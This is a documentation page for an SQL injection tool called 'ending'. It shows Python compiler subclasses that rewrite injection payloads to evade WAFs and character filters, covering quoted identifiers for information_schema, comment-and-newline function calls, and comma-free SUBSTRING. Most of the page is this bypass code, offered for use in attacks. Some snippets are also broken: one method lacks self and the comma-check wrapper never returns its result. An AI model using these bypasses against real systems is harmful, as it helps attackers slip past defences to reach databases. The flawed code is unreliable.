# Advanced usage

**ending** is made to assist you during complex injections. Bypassing filters, handling authentication, etc., can oftentime be done by rewriting part of the [`Compiler` object](compiler.md).

## SQL syntax

To bypass a WAF or badchars, you will often need to change the syntax of parts of your SQL injection. You can do this by overwriting one or several methods of a compiler. Each `compile_*` method is responsible for converting an AST element to its string representation.

### Quoting identifiers

An identifier is a keyword that designates a table, column, alias, etc. Some WAFs block combinations of database-table identifiers, such as `information_schema.tables`. A bypass consists of quoting the identifiers, for instance using double quotes, or backticks (depending on the database):

```sql
SELECT * FROM "information_schema"."tables" /* postgres */
SELECT * FROM `information_schema`.`tables` /* mysql */
```

To do so, one can rewrite the `compile_Identifier()` method of a compiler:

```python
class WAFBypassCompiler(mysql.Compiler):
    def compile_Identifier(self, identifier: Identifier, s: str) -> str:
        return ".".join(f'`{part}`' for part in identifier.name.split("."))
```



### WAF bypass

A pattern that is commonly blocked by WAFs are function calls of the form `SOME_FUNC(...)`. One way to bypass this is to add a comment and a newline right after the name of the function, like so:

```sql
SOME_FUNC -- some comment
(...)
```

Simply override the `compile_Function()` method:

```python
from ending.ast import Function


class WAFBypassCompiler(mysql.Compiler):
    def compile_Function(function: Function, s: str):
        lst = ",".join(str(arg) for arg in function.arguments)
        return f"{function.name} -- some comment\n({lst})"
```

That's it.

### Badchars

You might have encountered the case where the input parameter is split using commas (`,`). As a consequence, the injection payload cannot contain commas.
One difficulty is the `SUBSTRING(a, b, c)` call. It can, however, be converted to `SUBSTRING(a FROM b FOR c)` (on certain DBMSes). This can be implemented in a few lines of code:

```python
from ending.ast import Substring, Node


class BadCharBypassCompiler(mysql.Compiler):
        def compile(self, node: Node, s):
            """A failsafe wrapper to make sure the payload does not contain commas."""
            compiled = super().compile(node, s)
            if ',' in compiled:
                raise ValueError(f"The compiled payload {compiled!r} contains a comma !")
    
        def compile_Substring(self, substring: Substring, s):
            if substring.length is not None:
                return f"SUBSTRING({substring.string} FROM {substring.start+1} FOR {substring.length})"
            else:
                return f"SUBSTRING({substring.string} FROM {substring.start+1})"
```

The implementation of other problematic AST nodes is left as an exercise to the reader.